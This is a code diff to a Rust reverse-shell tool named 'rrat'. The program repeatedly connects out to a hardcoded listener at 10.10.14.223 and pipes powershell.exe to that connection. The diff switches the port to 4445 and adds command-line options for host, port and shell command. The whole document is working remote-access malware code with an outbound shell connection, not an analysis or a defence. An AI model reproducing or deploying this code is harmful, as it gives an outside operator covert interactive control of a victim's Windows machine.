@@ -11,6 +11,8 @@ extern crate env_logger;
 #[macro_use]
 extern crate log;
 
+extern crate clap;
+
 use std::net::*;
 use std::process::*;
 use std::io::*;
@@ -18,14 +20,16 @@ use std::thread;
 use std::sync::Arc;
 use std::time::Duration;
 use std::sync::atomic::{AtomicBool, Ordering};
+use clap::{Arg, App};
+
 
 const LHOST : &str = "10.10.14.223";
-const LPORT : &str = "4444";
+const LPORT : &str = "4445";
 const SHELL_TYPE : &str = "powershell.exe";
 const RETRY_DELAY_MS : u64 = 2_000;
 const SLEEP_DURATION_MS : u64 = 20;
 
-fn handle_network_connection(stream: TcpStream) {
+fn handle_network_connection(stream: TcpStream, cmd: &str) {
     debug!("Connected to {}", stream.peer_addr().unwrap());
 
     debug!("Changing stream to non-blocking");
@@ -35,7 +39,7 @@ fn handle_network_connection(stream: TcpStream) {
     let cloned_stream = stream.try_clone().expect("Failed to clone TCP stream");
 
     debug!("Connected to endpoint, starting shell");
-    let shell_child = Command::new(SHELL_TYPE)
+    let shell_child = Command::new(cmd)
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
         .spawn()
@@ -162,12 +166,37 @@ fn handle_network_connection(stream: TcpStream) {
 fn main() {
     env_logger::init();
 
+    let matches = App::new("rrat")
+        .arg(Arg::with_name("host")
+            .required(false)
+            .short("h")
+            .long("host")
+            .value_name("HOSTNAME or IP")
+            .takes_value(true))
+        .arg(Arg::with_name("port")
+            .required(false)
+            .short("p")
+            .long("port")
+            .value_name("PORT")
+            .takes_value(true))
+        .arg(Arg::with_name("cmd")
+            .required(false)
+            .short("c")
+            .long("command")
+            .value_name("CMD")
+            .takes_value(true))
+        .get_matches();
+
+    let host = matches.value_of("host").unwrap_or(LHOST);
+    let port = matches.value_of("port").unwrap_or(LPORT);
+    let cmd = matches.value_of("cmd").unwrap_or(SHELL_TYPE);
+
     loop {
-        let remote_server = format!("{}:{}", LHOST, LPORT);
+        let remote_server = format!("{}:{}", host, port);
         debug!("Attempting to connect to '{}'", remote_server);
 
         match TcpStream::connect(remote_server) {
-            Ok(stream) => handle_network_connection(stream),
+            Ok(stream) => handle_network_connection(stream, cmd),
             Err(_) => {
                 warn!("Failed to connect, waiting before retry");
                 std::thread::sleep(Duration::from_millis(RETRY_DELAY_MS));
